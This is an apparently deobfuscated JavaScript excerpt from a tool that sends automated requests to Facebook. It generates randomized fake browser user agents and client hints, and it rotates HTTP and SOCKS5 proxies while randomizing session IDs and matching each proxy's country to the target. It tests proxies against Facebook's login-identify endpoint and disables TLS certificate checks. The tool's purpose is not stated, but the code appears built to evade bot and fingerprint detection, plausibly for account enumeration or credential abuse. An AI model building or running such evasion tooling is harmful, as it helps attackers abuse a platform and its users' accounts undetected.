    v430 = v428.major + ".0." + v428.build + '.' + v429,
    v431 = GREASE_MAP_FP[v428.major] || "\"Not?A_Brand\";v=\"24\"";
  return {
    'name': "Windows Brave",
    'userAgent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v428.major + ".0.0.0 Safari/537.36",
    'browserType': "brave",
    'isMobile': false,
    'clientHints': {
      'sec-ch-ua': "\"Brave\";v=\"" + v428.major + "\", " + v431 + ", \"Chromium\";v=\"" + v428.major + '\x22',
      'sec-ch-ua-full-version-list': "\"Brave\";v=\"" + v430 + "\", " + v431.replace(/;v="(\d+)"/, ";v=\"$1.0.0.0\"") + ", \"Chromium\";v=\"" + v430 + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-model': '\x22\x22',
      'sec-ch-ua-platform': "\"Windows\"",
      'sec-ch-ua-platform-version': "\"19.0.0\"",
      'sec-ch-prefers-color-scheme': "dark"
    }
  };
}
function getMobileBraveUA() {
  const v432 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)];
  const v433 = Math.floor(Math.random() * (v432.maxPatch - v432.minPatch + 0x1)) + v432.minPatch,
    v434 = ANDROID_DEVICES[Math.floor(Math.random() * ANDROID_DEVICES.length)],
    v435 = GREASE_MAP_FP[v432.major] || "\"Not?A_Brand\";v=\"24\"",
    v436 = {};
  v436.name = "Android Brave", v436.userAgent = "Mozilla/5.0 (Linux; Android " + v434.os + ';\x20' + v434.model + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v432.major + ".0.0.0 Mobile Safari/537.36", v436.browserType = "brave", v436.isMobile = true, v436.clientHints = {};
  return v436.clientHints["sec-ch-ua"] = "\"Brave\";v=\"" + v432.major + "\", " + v435 + ", \"Chromium\";v=\"" + v432.major + '\x22', v436.clientHints["sec-ch-ua-mobile"] = '?1', v436.clientHints["sec-ch-ua-model"] = '\x22' + v434.model + '\x22', v436.clientHints["sec-ch-ua-platform"] = "\"Android\"", v436.clientHints["sec-ch-ua-platform-version"] = '\x22' + v434.os + ".0.0\"", v436.clientHints["sec-ch-prefers-color-scheme"] = "dark", v436;
}
function getDesktopVivaldiUA() {
  const v437 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v438 = Math.floor(Math.random() * (v437.maxPatch - v437.minPatch + 0x1)) + v437.minPatch,
    v439 = Math.max(0x7, Math.floor((v437.major - 0x6e) / 0x5) + 0x5),
    v440 = GREASE_MAP_FP[v437.major] || "\"Not?A_Brand\";v=\"24\"";
  const v441 = {};
  v441.name = "Windows Vivaldi", v441.userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v437.major + ".0.0.0 Safari/537.36 Vivaldi/" + v439 + ".0.0.0", v441.browserType = "vivaldi", v441.isMobile = false;
  v441.clientHints = {}, v441.clientHints["sec-ch-ua"] = "\"Chromium\";v=\"" + v437.major + "\", " + v440 + ", \"Vivaldi\";v=\"" + v439 + '\x22';
  return v441.clientHints["sec-ch-ua-mobile"] = '?0', v441.clientHints["sec-ch-ua-model"] = '\x22\x22', v441.clientHints["sec-ch-ua-platform"] = "\"Windows\"", v441.clientHints["sec-ch-ua-platform-version"] = "\"19.0.0\"", v441.clientHints["sec-ch-prefers-color-scheme"] = "dark", v441;
}
function getMobileFirefoxUA() {
  const v442 = Math.floor(Math.random() * 0x14) + 0x80,
    v443 = ANDROID_DEVICES[Math.floor(Math.random() * ANDROID_DEVICES.length)],
    v444 = {};
  v444.name = "Android Firefox", v444.userAgent = "Mozilla/5.0 (Android " + v443.os + "; Mobile; rv:" + v442 + ".0) Gecko/" + v442 + ".0 Firefox/" + v442 + '.0';
  v444.browserType = "firefox";
  v444.isMobile = true;
  return v444.clientHints = {}, v444;
}
function mfbGenIosUA() {
  const fn6 = (v458, v459) => Math.floor(Math.random() * (v459 - v458 + 0x1)) + v458,
    v445 = {};
  v445.major = 0xf, v445.minors = [0x0, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7, 0x8], v445.buildBase = 0x13;
  const v446 = {};
  v446.major = 0x10, v446.minors = [0x0, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7], v446.buildBase = 0x14;
  const v447 = {};
  v447.major = 0x11, v447.minors = [0x0, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6];
  v447.buildBase = 0x15;
  const v448 = {};
  v448.major = 0x12, v448.minors = [0x0, 0x1, 0x2, 0x3, 0x4, 0x5], v448.buildBase = 0x16;
  const v449 = [v445, v446, v447, v448],
    v450 = v449[fn6(0x0, v449.length - 0x1)],
    v451 = v450.minors[fn6(0x0, v450.minors.length - 0x1)],
    v452 = v450.major <= 0x10 ? Math.random() < 0.4 ? fn6(0x1, 0x2) : 0x0 : Math.random() < 0.2 ? 0x1 : 0x0;
  const v453 = String.fromCharCode(0x41 + v451),
    v454 = '' + v450.buildBase + v453 + fn6(0x32, 0x3e7),
    v455 = v450.major + '_' + v451 + (v452 > 0x0 ? '_' + v452 : ''),
    v456 = v450.major + '.' + v451 + (v452 > 0x0 ? '.' + v452 : ''),
    v457 = "iPhone; CPU iPhone OS " + v455 + " like Mac OS X";
  return "Mozilla/5.0 (" + v457 + ") AppleWebKit/605.1.15 (KHTML, like Gecko) Version/" + v456 + " Mobile/" + v454 + " Safari/605.1";
}
function getIosSafariUA() {
  const v460 = mfbGenIosUA(),
    v461 = {};
  v461.name = "iOS Safari (iPhone)", v461.userAgent = v460;
  v461.browserType = "safari";
  return v461.isMobile = true, v461.clientHints = {}, v461;
}
function getIosFbAppUA() {
  const v462 = IOS_DEVICES[Math.floor(Math.random() * IOS_DEVICES.length)],
    v463 = ["507.0.30.102", "488.0.17.110", "495.0.0.33.112", "510.0.0.28.115", "520.0.0.34.120"][Math.floor(Math.random() * 0x5)];
  const v464 = Math.floor(Math.random() * 0x1312d00) + 0x1d34ce80,
    v465 = ["ur_PK", "pt_BR", "en_US", "ar_AR", "es_LA", "fr_FR", "ru_RU"],
    v466 = v465[Math.floor(Math.random() * v465.length)],
    v467 = ["Ufone", "Vivo Brazil", "AT&T", "Vodafone", "T-Mobile", "Orange", "MegaFon"],
    v468 = v467[Math.floor(Math.random() * v467.length)],
    v469 = "Mozilla/5.0 (" + v462.devCode + "; CPU " + (v462.isTablet ? 'OS' : "iPhone OS") + '\x20' + v462.os + " like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/" + v462.build + " [FBAN/FBIOS;FBAV/" + v463 + ";FBPN/" + v462.app + ";FBLC/" + v466 + ";FBBV/" + v464 + ";FBCR/" + v468 + ";FBMF/Apple;FBBD/Apple;FBDV/" + v462.model + ";FBSV/" + v462.version + ";FBDM/{density=" + v462.density + ",width=" + v462.w + ",height=" + v462.h + "};FBDG/1;FBIA/FBIOS;]",
    v470 = {};
  v470.name = "iOS Facebook In-App";
  return v470.userAgent = v469, v470.browserType = "safari", v470.isMobile = true, v470.clientHints = {}, v470;
}
function getDesktopSafariUA() {
  const v471 = {};
  v471.name = "macOS Safari", v471.userAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15";
  v471.browserType = "safari", v471.isMobile = false, v471.clientHints = {};
  return v471;
}
function getPixel8MobileUA() {
  const v472 = {};
  v472.w = 0x19c, v472.h = 0x393, v472.dpr = 2.625, v472.cores = 0x8, v472.ram = 0x8;
  const v473 = {};
  v473.name = "Pixel 8/9 Chrome 152 (Mobile Web)", v473.userAgent = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36", v473.browserType = "mweb_pixel8", v473.isMobile = true, v473.clientHints = {};
  v473.hw = v472, v473.clientHints["sec-ch-ua"] = "\"Not?A_Brand\";v=\"24\", \"Google Chrome\";v=\"152\", \"Chromium\";v=\"152\"", v473.clientHints["sec-ch-ua-full-version-list"] = "\"Not?A_Brand\";v=\"24.0.0.0\", \"Google Chrome\";v=\"152.0.7977.66\", \"Chromium\";v=\"152.0.7977.66\"", v473.clientHints["sec-ch-ua-mobile"] = '?1';
  return v473.clientHints["sec-ch-ua-model"] = "\"Pixel 8\"", v473.clientHints["sec-ch-ua-platform"] = "\"Android\"", v473.clientHints["sec-ch-ua-platform-version"] = "\"14.0.0\"", v473.clientHints["sec-ch-prefers-color-scheme"] = "dark", v473;
}
const v101 = {};
v101.fn = getDesktopChromeUA, v101.weight = 0x1a, v101.type = "chrome";
const v102 = {};
v102.fn = getDesktopLinuxChromeUA, v102.weight = 0xf, v102.type = "linux";
const v103 = {};
v103.fn = getPixel8MobileUA, v103.weight = 0xe, v103.type = "mweb_pixel8";
const v104 = {};
v104.fn = getIosSafariUA, v104.weight = 0xc, v104.type = "safari";
const v105 = {};
v105.fn = getDesktopEdgeUA, v105.weight = 0xa, v105.type = "edge";
const v106 = {};
v106.fn = getDesktopLinuxFirefoxUA, v106.weight = 0x8, v106.type = "linux";
const v107 = {};
v107.fn = getDesktopBraveUA, v107.weight = 0x7, v107.type = "brave";
const v108 = {};
v108.fn = getDesktopOperaUA, v108.weight = 0x5, v108.type = "opera";
const v109 = {};
v109.fn = getDesktopFirefoxUA, v109.weight = 0x5, v109.type = "firefox";
const v110 = {};
v110.fn = getDesktopLinuxBraveUA, v110.weight = 0x5, v110.type = "linux";
const v111 = {};
v111.fn = getDesktopLinuxEdgeUA, v111.weight = 0x4, v111.type = "linux";
const v112 = {};
v112.fn = getSamsungUserAgent, v112.weight = 0x4, v112.type = "samsung";
const v113 = {};
v113.fn = getDesktopSafariUA, v113.weight = 0x4, v113.type = "safari";
const v114 = {};
v114.fn = getDesktopVivaldiUA, v114.weight = 0x3, v114.type = "vivaldi";
const v115 = {};
v115.fn = getDuckDuckGoDesktopUA, v115.weight = 0x3, v115.type = "duckduckgo";
const v116 = {};
v116.fn = getIosFbAppUA, v116.weight = 0x2, v116.type = "safari";
const v117 = {};
v117.fn = getMobileBraveUA, v117.weight = 0x2, v117.type = "brave";
const v118 = {};
v118.fn = getMobileOperaUA, v118.weight = 0x2, v118.type = "opera";
const v119 = {};
v119.fn = getMobileFirefoxUA, v119.weight = 0x2, v119.type = "firefox";
const UA_GENERATORS = [v101, v102, v103, v104, v105, v106, v107, v108, v109, v110, v111, v112, v113, v114, v115, v116, v117, v118, v119],
  UA_TOTAL_WEIGHT = UA_GENERATORS.reduce((v474, v475) => v474 + v475.weight, 0x0);
function getViaBrowserUA() {
  const v476 = ANDROID_DEVICES[Math.floor(Math.random() * ANDROID_DEVICES.length)];
  const v477 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v478 = Math.floor(Math.random() * (v477.maxPatch - v477.minPatch + 0x1)) + v477.minPatch,
    v479 = v477.major + ".0." + v477.build + '.' + v478,
    v480 = GREASE_MAP_FP[v477.major] || "\"Not?A_Brand\";v=\"24\"";
  return {
    'name': "Via Browser",
    'userAgent': "Mozilla/5.0 (Linux; Android " + v476.os + ';\x20' + v476.model + " Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/" + v477.major + ".0.0.0 Mobile Safari/537.36",
    'browserType': "via_browser",
    'isMobile': true,
    'clientHints': {
      'x-requested-with': "mark.via.gp",
      'sec-ch-ua': "\"Chromium\";v=\"" + v477.major + "\", " + v480 + ", \"Android WebView\";v=\"" + v477.major + '\x22',
      'sec-ch-ua-full-version-list': "\"Chromium\";v=\"" + v479 + "\", " + v480.replace(/;v="(\d+)"/, ";v=\"$1.0.0.0\"") + ", \"Android WebView\";v=\"" + v479 + '\x22',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-model': '\x22' + v476.model + '\x22',
      'sec-ch-ua-platform': "\"Android\"",
      'sec-ch-ua-platform-version': '\x22' + v476.os + ".0.0\"",
      'sec-ch-prefers-color-scheme': "light"
    }
  };
}
function getRandomUserAgent(v481) {
  let v482 = v481;
  (!v482 || v482 === SELECTED_BROWSER) && (SELECTED_BROWSERS && SELECTED_BROWSERS.length > 0x1 ? v482 = SELECTED_BROWSERS[Math.floor(Math.random() * SELECTED_BROWSERS.length)] : v482 = SELECTED_BROWSER);
  const v483 = FB_HOST === "m.facebook.com" || SELECTED_LANG === "m.facebook.com";
  v483 && (v482 === "random" || !v482) && (v482 = "random_mobile");
  if (v482 === "random_mobile") {
    const v485 = [getPixel8MobileUA, getIosSafariUA, getViaBrowserUA, getSamsungUserAgent, getMobileFirefoxUA, getMobileBraveUA, getMobileOperaUA];
    return v485[Math.floor(Math.random() * v485.length)]();
  }
  if (v482 === "via_browser") return getViaBrowserUA();
  if (v482 === "mweb_pixel8") return getPixel8MobileUA();
  if (v482 === "samsung") return getSamsungUserAgent();
  if (v482 === "mobile_firefox") return getMobileFirefoxUA();
  if (v482 === "mobile_brave") return getMobileBraveUA();
  if (v482 === "mobile_opera") return getMobileOperaUA();
  if (v482 === "ios") return getIosSafariUA();
  if (v482 === "duckduckgo") return getDuckDuckGoDesktopUA();
  if (v482 && v482 !== "random") {
    const v486 = UA_GENERATORS.filter(v487 => v487.type === v482);
    if (v486.length > 0x0) return v486[Math.floor(Math.random() * v486.length)].fn();
  }
  let v484 = Math.random() * UA_TOTAL_WEIGHT;
  for (const v488 of UA_GENERATORS) {
    v484 -= v488.weight;
    if (v484 <= 0x0) return v488.fn();
  }
  return getDesktopChromeUA();
}
let globalUA = getRandomClient(SELECTED_BROWSER),
  internalUA = getRandomClient(SELECTED_BROWSER);
function syncUAAndHost() {
  globalUA = getRandomClient(SELECTED_BROWSER), internalUA = getRandomClient(SELECTED_BROWSER);
}
function parseProxy(v489) {
  if (!v489 || typeof v489 !== "string") return null;
  v489 = v489.trim();
  if (!v489 || v489.startsWith('#')) return null;
  let v490 = "http";
  if (v489.startsWith("socks5://") || v489.startsWith("socks4://")) v490 = "socks5", v489 = v489.replace(/^socks[45]:\/\//i, '');else (v489.startsWith("http://") || v489.startsWith("https://")) && (v490 = "http", v489 = v489.replace(/^https?:\/\//i, ''));
  if (v489.includes('@')) {
    const v492 = v489.lastIndexOf('@'),
      v493 = v489.substring(0x0, v492),
      v494 = v489.substring(v492 + 0x1),
      v495 = v493.split(':'),
      v496 = v494.split(':');
    if (v496.length === 0x2 && !isNaN(parseInt(v496[0x1]))) return {
      'type': v490,
      'host': v496[0x0],
      'port': parseInt(v496[0x1]),
      'user': v495[0x0] || null,
      'pass': v495[0x1] || null
    };
    if (v495.length === 0x2 && !isNaN(parseInt(v495[0x1]))) return {
      'type': v490,
      'host': v495[0x0],
      'port': parseInt(v495[0x1]),
      'user': v496[0x0] || null,
      'pass': v496[0x1] || null
    };
  }
  const v491 = v489.split(':');
  if (v491.length === 0x2) {
    const v497 = parseInt(v491[0x1]);
    if (!isNaN(v497) && v497 > 0x0 && v497 <= 0xffff) {
      const v498 = {};
      return v498.type = v490, v498.host = v491[0x0], v498.port = v497, v498.user = null, v498.pass = null, v498;
    }
  }
  if (v491.length === 0x4) {
    const v499 = parseInt(v491[0x1]),
      v500 = parseInt(v491[0x3]);
    if (!isNaN(v499) && v499 > 0x0 && v499 <= 0xffff) {
      const v501 = {};
      return v501.type = v490, v501.host = v491[0x0], v501.port = v499, v501.user = v491[0x2], v501.pass = v491[0x3], v501;
    }
    if (!isNaN(v500) && v500 > 0x0 && v500 <= 0xffff) {
      const v502 = {};
      return v502.type = v490, v502.host = v491[0x2], v502.port = v500, v502.user = v491[0x0], v502.pass = v491[0x1], v502;
    }
  }
  return null;
}
function createHttpProxyAgent(v503) {
  const v504 = v503.user && v503.pass ? "Basic " + Buffer.from(v503.user + ':' + v503.pass).toString("base64") : null;
  const v505 = {};
  v505.keepAlive = false;
  const v506 = new https.Agent(v505);
  return v506.createConnection = (v507, v508) => {
    let v509 = null;
    const v510 = net.connect(v503.port, v503.host, () => {
      let v512 = "CONNECT " + v507.host + ':' + v507.port + " HTTP/1.1\r\n" + ("Host: " + v507.host + ':' + v507.port + '\x0d\x0a');
      if (v504) v512 += "Proxy-Authorization: " + v504 + '\x0d\x0a';
      v512 += '\x0d\x0a', v510.write(v512);
    });
    v509 = setTimeout(() => {
      v510.destroy();
      v508(new Error("Proxy TCP timeout (" + v503.host + ':' + v503.port + ')'));
    }, 0x2710);
    let v511 = '';
    const fn7 = v513 => {
        v511 += v513.toString("binary");
        const v514 = v511.indexOf("\r\n\r\n");
        if (v514 !== -1) {
          if (v509) clearTimeout(v509);
          v510.removeListener("data", fn7), v510.removeListener("error", fn8);
          const v515 = v511.split('\x0d\x0a')[0x0];
          if (v515.includes(" 200")) {
            const v516 = Buffer.from(v511.substring(v514 + 0x4), "binary");
            if (v516.length > 0x0) v510.unshift(v516);
            const v517 = {};
            v517.socket = v510, v517.servername = v507.host, v517.rejectUnauthorized = false;
            const v518 = tls.connect(v517);
            v518.on("error", v519 => {
              v508(v519);
            }), v508(null, v518);
          } else v510.destroy(), v508(new Error("Proxy connection failed: " + v515));
        }
      },
      fn8 = v520 => {
        if (v509) clearTimeout(v509);
        v510.destroy(), v508(v520);
      };
    v510.on("data", fn7), v510.on("error", fn8);
  }, v506;
}
function createSocks5ProxyAgent(v521) {
  const v522 = {};
  v522.keepAlive = false;
  const v523 = new https.Agent(v522);
  v523.createConnection = (v524, v525) => {
    let v526 = null;
    const v527 = net.connect(v521.port, v521.host, () => {
      const v530 = v521.user ? [0x0, 0x2] : [0x0];
      const v531 = Buffer.concat([Buffer.from([0x5, v530.length]), Buffer.from(v530)]);
      v527.write(v531);
    });
    v526 = setTimeout(() => {
      v527.destroy();
      v525(new Error("SOCKS5 TCP timeout (" + v521.host + ':' + v521.port + ')'));
    }, 0x2710);
    let v528 = "greeting",
      v529 = Buffer.alloc(0x0);
    const fn9 = v532 => {
        v529 = Buffer.concat([v529, v532]);
        if (v528 === "greeting") {
          if (v529.length < 0x2) return;
          const v533 = v529[0x0],
            v534 = v529[0x1];
          v529 = v529.slice(0x2);
          if (v533 !== 0x5) {
            if (v526) clearTimeout(v526);
            return v527.destroy(), v525(new Error("Invalid SOCKS version: " + v533));
          }
          if (v534 === 0x2) {
            v528 = "auth";
            const v535 = Buffer.from(v521.user, "utf8"),
              v536 = Buffer.from(v521.pass || '', "utf8"),
              v537 = Buffer.concat([Buffer.from([0x1, v535.length]), v535, Buffer.from([v536.length]), v536]);
            v527.write(v537);
          } else {
            if (v534 === 0x0) fn10();else {
              if (v526) clearTimeout(v526);
              return v527.destroy(), v525(new Error("Unsupported SOCKS auth method: " + v534));
            }
          }
        } else {
          if (v528 === "auth") {
            if (v529.length < 0x2) return;
            const v538 = v529[0x1];
            v529 = v529.slice(0x2);
            if (v538 !== 0x0) {
              if (v526) clearTimeout(v526);
              return v527.destroy(), v525(new Error("SOCKS authentication failed"));
            }
            fn10();
          } else {
            if (v528 === "connect") {
              if (v529.length < 0x4) return;
              const v539 = v529[0x1],
                v540 = v529[0x3];
              let v541 = 0x4;
              if (v540 === 0x1) v541 += 6;else {
                if (v540 === 0x3) {
                  if (v529.length < 0x5) return;
                  v541 += 0x1 + v529[0x4] + 0x2;
                } else {
                  if (v540 === 0x4) v541 += 18;else {
                    if (v526) clearTimeout(v526);
                    return v527.destroy(), v525(new Error("Unsupported SOCKS atyp: " + v540));
                  }
                }
              }
              if (v529.length < v541) return;
              v529 = v529.slice(v541);
              if (v539 !== 0x0) {
                if (v526) clearTimeout(v526);
                return v527.destroy(), v525(new Error("SOCKS connection failed with code: " + v539));
              }
              if (v526) clearTimeout(v526);
              v527.removeListener("data", fn9), v527.removeListener("error", fn11);
              if (v529.length > 0x0) v527.unshift(v529);
              const v542 = {};
              v542.socket = v527, v542.servername = v524.host, v542.rejectUnauthorized = false;
              const v543 = tls.connect(v542);
              v543.on("error", v544 => {
                v525(v544);
              }), v525(null, v543);
            }
          }
        }
      },
      fn10 = () => {
        v528 = "connect";
        const v545 = Buffer.from(v524.host, "utf8");
        const v546 = Buffer.alloc(0x2);
        v546.writeUInt16BE(v524.port, 0x0);
        const v547 = Buffer.concat([Buffer.from([0x5, 0x1, 0x0, 0x3, v545.length]), v545, v546]);
        v527.write(v547);
      },
      fn11 = v548 => {
        if (v526) clearTimeout(v526);
        v527.destroy();
        v525(v548);
      };
    v527.on("data", fn9);
    v527.on("error", fn11);
  };
  return v523;
}
class ProxyManager {
  constructor() {
    this.proxies = [], this.rawLines = [], this.index = 0x0, this.failureCounts = {};
    this.deadProxies = new Set(), this.reviveDeadAt = {}, this.autoCountry = true, this.proxyHits = 0x0;
    this.proxyErrors = 0x0, setInterval(() => {
      const v549 = Date.now();
      for (const [v550, v551] of Object.entries(this.reviveDeadAt)) {
        v549 >= v551 && (this.deadProxies.delete(Number(v550)), this.failureCounts[v550] = 0x0, delete this.reviveDeadAt[v550]);
      }
    }, 0xea60).unref();
  }
  get ["hasProxies"]() {
    return this.proxies.length > 0x0;
  }
  ["clear"]() {
    this.proxies = [];
    this.rawLines = [], this.index = 0x0;
    this.failureCounts = {};
    this.deadProxies.clear(), this.reviveDeadAt = {};
  }
  ["load"](v552) {
    if (!v552) return;
    let v553 = [];
    if (fs.existsSync(v552)) v553 = fs.readFileSync(v552, "utf8").split(/\r?\n/).map(v554 => v554.trim()).filter(v555 => v555 && !v555.startsWith('#'));else v552.includes(':') && (v553 = [v552]);
    this.rawLines = v553, this.proxies = [];
    for (const v556 of v553) {
      const v557 = parseProxy(v556);
      !v557 && (console.error(R("\n  ✗ Invalid proxy format detected: \"" + v556 + '\x22')), console.error(R("  Please use one of the supported formats:")), console.error(R("    - host:port")), console.error(R("    - user:pass@host:port")), console.error(R("    - host:port:user:pass")), console.error(R("    - user:pass:host:port\n")), process.exit(0x1)), this.proxies.push(v557);
    }
    if (this.proxies.length) console.log(G("  Proxies loaded: " + Y(this.proxies.length)));
  }
  ["getNext"](v558 = null) {
    if (!this.proxies.length) return null;
    const v559 = this.proxies.map((v564, v565) => ({
        'p': v564,
        'i': v565
      })).filter(({
        i: v566
      }) => !this.deadProxies.has(v566)),
      v560 = v559.length ? v559 : this.proxies.map((v567, v568) => ({
        'p': v567,
        'i': v568
      })),
      v561 = v560[this.index % v560.length];
    this.index++;
    const v562 = {
        ...v561.p
      },
      v563 = v562;
    v563.user && (v563.user = v563.user.replace(/-session-[A-Za-z0-9_]+/, "-session-" + randomSessionId()).replace(/-ssid-[A-Za-z0-9_]+/, "-ssid-" + randomSessionId()).replace(/_sid_[A-Za-z0-9]+/, "_sid_" + randomSessionId()).replace(/_SESSID_[A-Za-z0-9]+/i, "_SESSID_" + randomSessionId()));
    if (this.autoCountry && v558 && v563.user) {
      const v569 = detectCountry(v558);
      if (v569) {
        const v570 = v569.toLowerCase();
        if (/-country-[a-z]{2}/i.test(v563.user)) v563.user = v563.user.replace(/(-country-)[a-z]{2}/i, '$1' + v570);else {
          if (/_country_[a-z]{2}/i.test(v563.user)) v563.user = v563.user.replace(/(_country_)[a-z]{2}/i, '$1' + v570);else {
            if (/-cc-[a-z]{2}/i.test(v563.user)) v563.user = v563.user.replace(/(-cc-)[a-z]{2}/i, '$1' + v570);else {
              if (/_cc_[a-z]{2}/i.test(v563.user)) v563.user = v563.user.replace(/(_cc_)[a-z]{2}/i, '$1' + v570);else /-zone-[a-z]{2}/i.test(v563.user) && (v563.user = v563.user.replace(/(-zone-)[a-z]{2}/i, '$1' + v570));
            }
          }
        }
      }
    }
    return v563;
  }
  ["recordSuccess"](v571) {
    this.proxyHits++;
  }
  ["recordFailure"](v572) {
    this.proxyErrors++;
    const v573 = v572 % this.proxies.length;
    this.failureCounts[v573] = (this.failureCounts[v573] || 0x0) + 0x1;
    this.failureCounts[v573] >= 0x5 && (this.deadProxies.add(v573), this.reviveDeadAt[v573] = Date.now() + 180000, dbg("[PROXY] Marked proxy #" + v573 + " dead, will revive at " + new Date(this.reviveDeadAt[v573]).toISOString()));
  }
  ["getStatus"]() {
    const v574 = this.proxies.length - this.deadProxies.size;
    return v574 + '/' + this.proxies.length + " alive" + (this.autoCountry ? " · Auto-Country" : '');
  }
  ["toUrl"](v575) {
    const v576 = v575.user ? encodeURIComponent(v575.user) + ':' + encodeURIComponent(v575.pass || '') + '@' : '';
    return (v575.type === "socks5" ? "socks5" : "http") + "://" + v576 + v575.host + ':' + v575.port;
  }
  async ["testConnectivity"]() {
    if (!this.hasProxies) return true;
    console.log(C("  ── Proxy Connectivity Test (" + this.proxies.length + " proxies) ──"));
    let v577 = 0x0,
      v578 = 0x0;
    const fn12 = async (v579, v580) => {
      try {
        let v581;
        const v582 = new Promise((v584, v585) => {
            v581 = setTimeout(() => v585(new Error("timeout")), 0x2ee0);
          }),
          v583 = await Promise.race([httpsGetPage("/login/identify/", '', 0x2ee0, "www.facebook.com", v579, internalUA), v582]);
        clearTimeout(v581);
        if (v583.status >= 0xc8 && v583.status < 0x190) {
          v577++;
          return;
        }
        throw new Error("HTTP " + v583.status);
      } catch (v586) {
        this.deadProxies.add(v580), v578++;
      }
    };
    await Promise.all(this.proxies.map((v587, v588) => fn12(v587, v588))), console.log("  ── Result: " + G(v577 + " alive") + " / " + R(v578 + " dead") + " out of " + this.proxies.length + " proxies ──");
    if (v577 === 0x0) return console.log(R("  All proxies are dead.")), false;
    console.log(B("  ✓ " + v577 + " proxy/proxies ready. Dead proxies excluded from run."));
    return true;
  }
}
const proxyManager = new ProxyManager();
function getProxy(v589) {
  return proxyManager.getNext(v589);
}
function randomSessionId() {
  return crypto.randomBytes(0x6).toString("hex");
}
function getTimezoneOffset(v590) {
  return COUNTRY_TIMEZONE_OFFSETS[v590] !== undefined ? COUNTRY_TIMEZONE_OFFSETS[v590] : 0x0;
}
function extractProxyCountry(v591) {
  if (!v591 || !v591.user) return null;
  const v592 = v591.user.match(/[-_](?:country|zone|cc)[-_]([A-Za-z]{2})/i);
  return v592 ? v592[0x1].toUpperCase() : null;
}
function resolveTimezone(v593, v594) {
  const v595 = detectCountry(v594);
  if (v595 && COUNTRY_TIMEZONE_OFFSETS[v595] !== undefined) return COUNTRY_TIMEZONE_OFFSETS[v595];
  const v596 = extractProxyCountry(v593);
  if (v596 && COUNTRY_TIMEZONE_OFFSETS[v596] !== undefined) return COUNTRY_TIMEZONE_OFFSETS[v596];
  return 0x0;
}
function proxyHttpsRequestSingle(v597, v598, v599, v600 = 0x3a98) {
  return new Promise((v601, v602) => {
    let v603;
    try {
      v597.type === "socks5" ? v603 = createSocks5ProxyAgent(v597) : v603 = createHttpProxyAgent(v597);
    } catch (v607) {
      return v602(new Error("Proxy agent init failed: " + v607.message));
    }
    const v604 = v599 || '',
      v605 = {
        'hostname': v598.hostname,
        'port': 0x1bb,
        'path': v598.path,
        'method': v598.method || "GET",
        'headers': {
          ...v598.headers,
          'Host': v598.hostname
        },
        'agent': v603,
        'timeout': v600,
        'ciphers': "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA",
        'ecdhCurve': "X25519:P-256:P-384",
        'honorCipherOrder': false,
        'secureOptions': require("crypto").constants.SSL_OP_NO_SSLv3 | require("crypto").constants.SSL_OP_NO_TLSv1 | require("crypto").constants.SSL_OP_NO_TLSv1_1
      };
    if (v604) v605.headers["Content-Length"] = Buffer.byteLength(v604);
    dbg("[PROXY REQUEST] → http://" + v597.host + ':' + v597.port + " | " + v598.hostname + v598.path);
    const v606 = https.request(v605, v608 => {
      const v609 = [];
      v608.on("data", v610 => {
        v609.push(v610);
        trackBytes(v610.length);
      }), v608.on("error", v611 => {
        try {
          v602(v611);
        } catch (v612) {}
      });
      v608.on("end", () => {
        dbg("[PROXY RESPONSE] HTTP " + v608.statusCode + " from " + v597.host + ':' + v597.port);
        let v613 = Buffer.concat(v609);
        const v614 = (v608.headers["content-encoding"] || '').trim().toLowerCase();
        try {
          if (v614.includes('br')) v613 = zlib.brotliDecompressSync(v613);else {
            if (v614.includes("gzip")) v613 = zlib.gunzipSync(v613);else {
              if (v614.includes("deflate")) v613 = zlib.inflateSync(v613);else {
                if (v614.includes("zstd") || v613.length >= 0x4 && v613[0x0] === 0x28 && v613[0x1] === 0xb5 && v613[0x2] === 0x2f && v613[0x3] === 0xfd) {
                  dbg("[WARN] ZSTD response from " + v597.host + ':' + v597.port + " (enc=\"" + v614 + "\") — rotating proxy");
                  const v615 = new Error("ZSTD_ENCODING");
                  return v615.code = "ZSTD_ENCODING", v602(v615);
                } else {
                  if (v614 && v614 !== "identity") {
                    const v616 = v613.slice(0x0, 0x78).toString("hex");
                    dbg("[WARN] Unknown content-encoding: \"" + v614 + "\" from " + v597.host + ':' + v597.port + " — body[0..120]=" + v616);
                  }
                }
              }
            }
          }
        } catch (v617) {
          dbg("[WARN] Decompression failed (" + v614 + "): " + v617.message);
        }
        if (v608.statusCode >= 0x1f6 && v608.statusCode <= 0x1f8) return v602(new Error("Proxy server returned HTTP " + v608.statusCode));
        (v608.statusCode === 0x12d || v608.statusCode === 0x12e) && v598.method === "POST" && dbg("[WARN] POST " + v598.hostname + v598.path + " returned " + v608.statusCode + " → " + (v608.headers.location || "no location") + " (session invalidated or proxy intercept)");
        v601({
          'status': v608.statusCode,
          'data': v613.toString(),
